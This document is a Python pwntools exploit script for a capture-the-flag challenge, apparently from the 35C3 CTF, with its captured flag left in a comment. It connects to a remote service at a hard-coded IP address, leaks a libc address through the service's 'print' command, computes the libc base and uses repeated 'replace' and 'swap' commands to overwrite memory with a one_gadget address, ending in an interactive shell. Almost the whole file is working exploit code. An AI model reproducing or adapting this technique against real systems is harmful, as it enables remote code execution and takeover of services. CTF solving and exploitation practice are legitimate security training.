#!/usr/bin/python
from pwn import *
from binascii import *
from IPython import embed
r = remote('35.207.132.47', 22225)

one_gadget = 0x10a38c

retAddr = p32(0x40246d)

string1 = r.recvline_startswith('String1: ')[9:]
string2 = r.recvline_startswith('String2: ')[9:]



for i in range(0x5): #0x48+7
    r.sendlineafter('> ', 'replace')
    r.sendline('\x00')
    r.sendline('z')

sleep(0.4)
r.sendlineafter('> ', 'print')
leak = r.recvuntil('\xff\xff\xff')
libc_start_main = leak[-12:-6]
libc_start_main = list(libc_start_main)
libc_start_main.reverse()
libc_start_main = (''.join(libc_start_main)).encode('hex')

libc_base = int(libc_start_main, 16) - 0xe7 - 0x21ab0
print(hex(libc_base))
payload = libc_base+one_gadget
print(hex(payload))

# start swap
# 1 BYTE

shell = p64(payload)[:4]

def replaceAndSwap(sh,i):
    r.sendlineafter('> ', 'replace')
    r.sendline('z')
    r.sendline(sh)

    r.sendlineafter('> ', 'swap')
    r.sendline(str(10+i))
    r.sendline(str(136+i))

for i, val in enumerate(shell):
    replaceAndSwap(val, i)

# 35C3_fb23c497dbbf35b0f13b9d16311fa59cf8ac1b02
r.interactive()
